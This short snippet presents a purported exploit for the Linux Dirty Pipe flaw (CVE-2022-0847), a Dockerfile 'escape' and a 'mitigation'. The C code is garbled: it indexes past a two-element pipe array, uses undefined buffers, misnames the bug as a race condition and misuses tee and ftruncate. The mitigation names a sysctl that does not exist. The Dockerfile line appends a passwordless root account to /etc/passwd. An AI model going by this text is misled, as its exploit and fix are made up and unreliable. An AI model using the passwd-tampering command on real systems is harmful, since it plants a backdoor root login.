**CVE-2022-0847** exploits a **race condition** in `pipe_buffer` to overwrite arbitrary files via **splice()**:
```c
// exploit.c
int main() {
    int p[2];
    pipe(p);
    write(p[1], buf, 4096); // Overwrite page cache
    tee(p[1], p[2]);
    ftruncate(p[1], 0); // Free page
    lseek(p[2], 0, SEEK_SET); // Reuse page
    for (int i=0; i<1000000; i++) {
        splice(p[1], NULL, p[2], NULL, 1, SPLICE_F_MOVE);
    }
    write(p[1], payload, 4096); // Overwrite /etc/passwd
}
```
Escaping Docker containers:
```dockerfile
RUN echo "root::0:0::/root:/bin/sh" >> /etc/passwd
```
Mitigation:
```bash
echo "kernel.dirty_pipe=0" > /etc/sysctl.conf
apt install linux-image-5.15.0-67-generic # patched kernel
```

